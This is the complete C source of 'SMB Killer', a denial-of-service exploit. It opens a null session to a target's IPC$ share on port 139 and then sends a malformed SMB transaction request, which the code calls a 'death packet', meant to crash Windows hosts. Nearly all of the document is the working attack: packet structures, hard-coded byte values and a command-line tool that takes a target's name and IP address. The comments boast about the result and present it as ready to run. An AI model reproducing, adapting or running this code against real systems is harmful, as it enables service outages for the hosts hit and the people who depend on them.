/*********************************************************************
*
*  smbkiller.c - Written by b0uNtYkI113r, with code borrowed from
*    RFParalyze.c written by rain forest puppy (rfp@wiretrip.net)
*
*  This code was created after analyzing a packet capture of the
*  SMBDie.exe program written by RedButton found on
*  packetstorm.decepticons.org. It has a couple of shortcomings
*  (like limited to 32 chars in the hostname, check to see if the
*  host died) but it does the trick...
*
*  Basically what happens:
*    - Establish a connection to the IPC$ share on the target host
*    - Send the death packet (transaction request with counts all
*      zero)
*
*  This has been compiled with Visual C++ on win2k and win98 and
*  gcc on SunOS and Linux. I haven't actually run it on the *nix
*  platforms because I don't have a good testbed but it runs like
*  a champ on windows. Should have no problems running it on *nix.
*  If you compile for windows without Visual C++, just make sure
*  that WIN32 has been defined as a preproccessor directive, this
*  will include the code that it needs to run under windows.
*
*********************************************************************/

#ifdef WIN32
#include <windows.h>
#else
#define SOCKET int
#define SOCKET_ERROR -1
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/uio.h>
#endif
#include <stdio.h>

#define TARGET_PORT 139
char *TARGET_HOST = NULL;
char *TARGET_HOST_IP = NULL;

/* Netbios header, included in all Net Bios network packets */
typedef struct NetBiosHeader_S {
	char messageType; /* Type of netbios message */
	char flags;
	char length[2];  /* Length of this netbios packet */
} NetBiosHeader;

/* Structure to connect and start a netbios session */
typedef struct NBSessionRequest_S
{
	char space1;
  char destname[32]; /* Destination computer */
	char null;
  char space2;
  char srcname[32];  /* Source computer */
  char end[5];
} NBSessionRequest;

/* Header structure for the Server Message Block (SMB) protocol
    included in all smb protocol transactions
*/
typedef struct SMBHeader_S {
  char serverComponent[4]; /* Always \xFFSMB */
  char command;
  char errorClass;
  char reserved1;
  char errorCode[2];
  char flags;
  char flags2[2];
  char reserved2[12];
  char treeID[2];
  char processID[2];
  char userID[2];
  char multiplexID[2];
} SMBHeader;

/* Some nice constants for setting up a SMB header record */
#define HEADER_PROTOCOL_REQUEST     0x1
#define HEADER_SESSION_SETUP        0x2
#define HEADER_TREE_CONNECT         0x3
#define HEADER_TRANSACTION_REQUEST  0x4

/* Structure to negotiate a common protocol between the target host
    and the source host */
typedef struct NegotiateProtocol_S {
  char wordCount;
  char byteCount[2];
  char dialects[130];
} NegotiateProtocol;

/* List of dialects that this program can speak */
char dialects[] =
"\x02PC NETWORK PROGRAM 1.0\x00"
"\x02MICROSOFT NETWORKS 1.03\x00"
"\x02MICROSOFT NETWORKS 3.0\x00"
"\x02LANMAN1.0\x00"
"\x02LM1.2X002\x00"
"\x02Samba\x00"
"\x02NT LM 0.12\x00"
"\x02NT LANMAN 1.0\x00";

/* Structure used to establish a null session on the
  target host */
typedef struct SessionSetup_S {
  char wordCount;
  char andXCommand;
  char reserved1;
  char andXOffset[2];
  char maxBufferCount[2];
  char maxMpxCount[2];
  char vcNumber[2];
  char sessionKey[4];
  char ansiPasswordLen[2];
  char unicodePasswordLen[2];
  char reserved2[4];
  char capabilities[4];
  char byteCount[2];
  char ansiPassword;
  char account;
  char domain[10];
  char nativeOS[5];
  char nativeLan[6];
} SessionSetup;

/* Structure to actually connect to the IPC$ share */
typedef struct TreeConnect_S {
  char wordCount;
  char andXCommand;
  char reserved1;
  char andXOffset[2];
  char flags[2];
  char passwordLen[2];
  char byteCount[2];
  char password;
} TreeConnect;

/* This is the actual death packet, just set all
  the count fields to zero and watch the fun */
typedef struct TransactionRequest_S {
  char wordCount;
  char totalParamCount[2];
  char totalDataCount[2];
  char maxParamCount[2];
  char maxDataCount[2];
  char maxSetupCount;
  char reserved1;
  char flags[2];
  char timeout[4];
  char reserved2[2];
  char paramCount[2];
  char paramOffset[2];
  char dataCount[2];
  char dataOffset[2];
  char setupCount;
  char reserved3;
  char byteCount[2];
  char transactionName[13];
  char parameters[19];
} TransactionRequest;

/* This function fills in the data for an SMB header
  structure based on what type of message we're sending */
void populateSMBHeader(SMBHeader *sh, int header_type) {
  memset(sh, 0, sizeof(SMBHeader));

  memcpy(sh->serverComponent, "\xFF\x53\x4D\x42", 4);

  switch(header_type) {
    case HEADER_PROTOCOL_REQUEST :
      sh->command = '\x72';
      memcpy(sh->processID, "\xED\x18", 2);
      memcpy(sh->multiplexID, "\x51\x19", 2);
      break;

    case HEADER_SESSION_SETUP :
      sh->command = '\x73';
      memcpy(sh->flags2, "\x01\x00", 2);
      memcpy(sh->processID, "\x01\x04", 2);
      memcpy(sh->multiplexID, "\x65\x04", 2);
      break;

    case HEADER_TREE_CONNECT :
      sh->command = '\x75';
      sh->flags = '\x18';
      memcpy(sh->flags2, "\x01\x20", 2);
      memcpy(sh->processID, "\x00\x28", 2);
      memcpy(sh->userID, "\x00\x08", 2);
      break;

    case HEADER_TRANSACTION_REQUEST :
      sh->command = '\x25';
      memcpy(sh->treeID, "\x00\x08", 2);
      memcpy(sh->processID, "\x24\x04", 2);
      memcpy(sh->userID, "\x00\x08", 2);
      break;

  }
}

/* Fill in the negotiate protocol data structure */
void populateNegotiateProtocol(NegotiateProtocol *np) {
  memset(np, 0, sizeof(NegotiateProtocol));
  memcpy(np->byteCount, "\x81\x00", 2);
  memcpy(np->dialects, dialects, sizeof(dialects));
}

/* Fill in the session setup data structure */
void populateSessionSetup(SessionSetup *ss) {
  memset(ss, 0, sizeof(SessionSetup));
  ss->wordCount = '\x0D';
  ss->andXCommand = '\xFF';
  memcpy(ss->maxBufferCount, "\xFF\xFF", 2);
  memcpy(ss->maxMpxCount, "\x02\x00", 2);
  memcpy(ss->vcNumber, "\x01\x04", 2);
  memcpy(ss->ansiPasswordLen, "\x01\x00", 2);
  memcpy(ss->byteCount, "\x17\x00", 2);
  memcpy(ss->domain, "WORKGROUP\x00", 10);
  memcpy(ss->nativeOS, "Unix\x00", 5);
  memcpy(ss->nativeLan, "Samba\x00", 6);
}

/* Fill in the tree connect structure */
void populateTreeConnect(TreeConnect *tc) {
  memset(tc, 0, sizeof(TreeConnect));
  tc->wordCount = '\x04';
  tc->andXCommand = '\xFF';
  memcpy(tc->passwordLen, "\x01\x00", 2);
  memcpy(tc->byteCount, "\x14\x00", 2);
}

/* Fill in the transaction request structure */
void populateTransactionRequest(TransactionRequest *tr) {
  memset(tr, 0, sizeof(TransactionRequest));
  tr->wordCount = '\x0E';
  memcpy(tr->totalParamCount, "\x13\x00", 2);
  memcpy(tr->paramCount, "\x13\x00", 2);
  memcpy(tr->paramOffset, "\x4C\x00", 2);
  memcpy(tr->dataOffset, "\x5F\x00", 2);
  memcpy(tr->byteCount, "\x20\x00", 2);
  memcpy(tr->transactionName, "\\PIPE\\LANMAN\x00", 13);
  memcpy(tr->parameters, 
"\x68\x00\x57\x72\x4C\x65\x68\x00\x42\x31\x33\x42\x57\x7A\x00\x01\x00\xE0\xFF", 
19);
}

/* Sends a netbios message to the target */
int sendNBMessage(SOCKET s, char msgtype, char *data, int len, char *buffer, 
int buflen, int waitreturn) {
  NetBiosHeader nbh;
  int r, totalSize = sizeof(NetBiosHeader) + len, offset = 
sizeof(NetBiosHeader);
  char *sendBuffer = NULL;

  /* Setup the NetBios header structure */
  nbh.messageType = msgtype;
  nbh.flags = '\x00';
  nbh.length[0] = ((char*)&len)[1];
  nbh.length[1] = ((char*)&len)[0];

  /* Setup a buffer to contain the entire message */
  sendBuffer = (char*) malloc(totalSize);
  memcpy(sendBuffer, &nbh, sizeof(NetBiosHeader));
  memcpy(sendBuffer + offset, data, len);

  /* Send the data to the host */
  send(s, sendBuffer, totalSize, 0);
  free(sendBuffer);

  /* Receive any return data */
  if(waitreturn)
    r = recv(s, buffer, buflen, 0);
  else
    r = 0;

  return r;
}

/* Pads out the netbios name in a session request,
  props to rain forest puppy (rfp@wiretrip.net)
  and his RFPParalyze.c code on el8.org for this
  function */
void Pad_Name(char *name1, char *name2)
{ char c, c1, c2;
  int i, len;

  len = strlen(name1);

  for (i = 0; i < 16; i++) {

    if (i >= len) {
     c1 = 'C'; c2 = 'A'; /* CA is a space */
    }
    else {
      c = name1[i];
      c1 = (char)((int)c/16 + (int)'A');
      c2 = (char)((int)c%16 + (int)'A');
    }

    name2[i*2] = c1;
    name2[i*2+1] = c2;

  }

  name2[32] = 0;   /* Put in the null ...*/
}

/* Prints out an error message and exits the program */
void handleError(char *msg) {
  printf("ERROR: %s\n", msg);
#ifdef WIN32
  WSACleanup();
#endif
  exit(1);
}

/* Connect to the target host */
SOCKET connectToHost() {
  /* Lookup the host information */
  struct sockaddr_in sa;
  char errbuf[256];
  SOCKET s;

  /* Create the socket */
  s = socket(AF_INET, SOCK_STREAM, 0);

  sa.sin_family = AF_INET;
  sa.sin_port = htons(TARGET_PORT);
  sa.sin_addr.s_addr = inet_addr(TARGET_HOST_IP);

  /* Connect to the target host */
  if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
    sprintf(errbuf, "Unable to connect to %s on port %d...\n", TARGET_HOST, 
TARGET_PORT);
    handleError(errbuf);
  }

  return s;
}

/* Connect to a null session on the target computer */
int connectSession(SOCKET s) {
  /* Setup the initial SMB request */
  char myname[33], target[33], buf[4000];
  NBSessionRequest smbreq;
  int x;

  Pad_Name("", myname);
  myname[30] = 'A';
  myname[31] = 'A';

  Pad_Name(TARGET_HOST, target);

  memset(buf,0,4000);

  /* Setup the session request data elements */
  smbreq.space1 = '\x20';
  smbreq.space2 = '\x20';
  smbreq.null = '\x00';
  memcpy(smbreq.end,"\x00\x00\x00\x00\x00",5);
  memcpy(smbreq.srcname, myname, 32);
  memcpy(smbreq.destname, target, 32);

  /* Send the session request */
  x = sendNBMessage(s, '\x81', (char*)&smbreq,
              sizeof(NBSessionRequest), buf, 4000, 1);

  if(x < 1) {
    handleError("Problem, didn't get response\n");
  }

  if(buf[0] == '\x82')
    return 0; /* Got an OK from the host */
  else
    return 1; /* Non-OK message, return error */
}

/* Send protocol information to the host */
int setupProtocols(SOCKET s) {
	SMBHeader smbh;
	NegotiateProtocol np;
	int x, totalSize = sizeof(SMBHeader) + sizeof(NegotiateProtocol);
	char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(NegotiateProtocol)];

	populateSMBHeader(&smbh, HEADER_PROTOCOL_REQUEST);
	populateNegotiateProtocol(&np);

  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &np, sizeof(NegotiateProtocol));

  x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

	if(x >= 1)
		return 0;
	else
		return 1;
}

/* Setup the actual session, this returns a user id to be used
  in subsequent calls to the target */
int setupSession(SOCKET s, int *userID) {
  SMBHeader smbh;
  SessionSetup ss;
  int x, totalSize = sizeof(SMBHeader) + sizeof(SessionSetup), temp = 0;
  char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(SessionSetup)];

  populateSMBHeader(&smbh, HEADER_SESSION_SETUP);
  populateSessionSetup(&ss);

  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &ss, sizeof(SessionSetup));

  x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

  /* Make sure we got some data back */
  if(x >= 1) {
    /* Retrieve the user id from the returned data */
    memcpy(&smbh, buf + sizeof(NetBiosHeader), sizeof(SMBHeader));
    if(smbh.errorCode[0] != '\x00')
      return 1;

    ((char*)&temp)[0] = smbh.userID[0];
    ((char*)&temp)[1] = smbh.userID[1];

    *userID = temp;

    return 0;
  }
  else
    return 1;
}

/* Connect to the IPC$ share, this returns a tree id to be used
  in the subsequent transaction call */
int connectTree(SOCKET s, int userID, int *treeID) {
  SMBHeader smbh;
  TreeConnect tc;
  int x, totalSize, temp = 0, hostlen = 0, byteCount = 0;
  char buf[4000], *sendBuf = NULL;

  populateSMBHeader(&smbh, HEADER_TREE_CONNECT);
  populateTreeConnect(&tc);

  smbh.userID[0] = ((char*)&userID)[0];
  smbh.userID[1] = ((char*)&userID)[1];

  /* Put in the host information */
  sprintf(buf, "\\\\%s\\IPC$", TARGET_HOST);
  hostlen = strlen(buf) + 1;
  byteCount = hostlen + 6;
  totalSize = sizeof(SMBHeader) + sizeof(TreeConnect) + hostlen + 5;
  sendBuf = (char*)malloc(totalSize);

  /* Set the byte count of this message */
  tc.byteCount[0] = ((char*)&byteCount)[0];
  tc.byteCount[1] = ((char*)&byteCount)[1];

  /* Copy all the data to a buffer to send it */
  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &tc, sizeof(TreeConnect));
  memcpy(sendBuf + sizeof(SMBHeader) + sizeof(TreeConnect), buf, hostlen);
  memcpy(sendBuf + sizeof(SMBHeader) + sizeof(TreeConnect) + hostlen, 
"IPC\x00\x00", 5);

  x = sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 1);

  /* Make sure we got some data back */
  if(x >= 1) {
    memcpy(&smbh, buf + sizeof(NetBiosHeader), sizeof(SMBHeader));
    if(smbh.errorCode[0] != '\x00')
      return 1;

    /* Extract the tree ID from the returned message */
    ((char*)&temp)[0] = smbh.treeID[0];
    ((char*)&temp)[1] = smbh.treeID[1];

    *treeID = temp;

    return 0;
  }
  else
    return 1;
}

/* Send the actual death packet call, using the user id and
  tree id we got back from the server */
void sendTransaction(SOCKET s, int userID, int treeID) {
  SMBHeader smbh;
  TransactionRequest tr;
  int totalSize = sizeof(SMBHeader) + sizeof(TransactionRequest);
  char buf[4000], sendBuf[sizeof(SMBHeader) + sizeof(TransactionRequest)];

  populateSMBHeader(&smbh, HEADER_TRANSACTION_REQUEST);
  populateTransactionRequest(&tr);

  /* Set the user id and tree id */
  smbh.userID[0] = ((char*)&userID)[0];
  smbh.userID[1] = ((char*)&userID)[1];
  smbh.treeID[0] = ((char*)&treeID)[0];
  smbh.treeID[1] = ((char*)&treeID)[1];

  /* Copy all the data to a buffer to send */
  memcpy(sendBuf, &smbh, sizeof(SMBHeader));
  memcpy(sendBuf + sizeof(SMBHeader), &tr, sizeof(TransactionRequest));

  sendNBMessage(s, '\x00', sendBuf, totalSize, buf, 4000, 0);
}

int main(int argc, char *argv[]) {
  SOCKET s;
#ifdef WIN32
  WSADATA wd;
  WORD wVersionRequested = MAKEWORD( 2, 2 );
#endif
  char buf[256];
  int userID, treeID;

  printf("SMB Killer v0.1\nWritten by the b0uNtYkI113r\n");

  if(argc != 3) {
    printf("Usage: %s <target host name> <target host ip>\n", argv[0]);
    return 0;
  }

  TARGET_HOST = argv[1];
  TARGET_HOST_IP = argv[2];

#ifdef WIN32
  /* Load the winsock library (Winblows only) */
  if(WSAStartup(wVersionRequested, &wd) != 0) {
    printf("Could not initialize Winsock services!\n");
    return 0;
  }
#endif

  /* Connect to the target host */
  if((s = connectToHost()) != SOCKET_ERROR)
    printf("Connected to %s on port %d\n", TARGET_HOST, TARGET_PORT);

  /* Create a session */
  if(!connectSession(s))
    printf("Session connected...\n");
  else {
    sprintf(buf, "Unable to connect to session with host %s...\n", 
TARGET_HOST);
    handleError(buf);
  }

  /* Setup the protocol to be used for death */
	if(!setupProtocols(s))
		printf("Protocols negotiated...\n");
  else
    handleError("Unable to negotiate protocols...\n");

  /* Setup the session and get a user id */
  if(!setupSession(s, &userID))
    printf("Session connected and established, User ID: %d...\n", userID);
  else
    handleError("Unable establish session...\n");

  /* Connect to the IPC$ share and get a tree id */
  if(!connectTree(s, userID, &treeID))
    printf("Connected to \\\\%s\\IPC$ session, Tree ID: %d...\n", 
TARGET_HOST, treeID);
  else {
    sprintf(buf, "Unable to connect to \\\\%s\\IPC$ session...\n", 
TARGET_HOST);
    handleError(buf);
  }

  /* Send the actual death packet */
  sendTransaction(s, userID, treeID);
  printf("SMB killer packet sent!\n");


#ifdef WIN32
  /* Unload the winsock library (Winblows only) */
  WSACleanup();
#endif

  return 0;
}
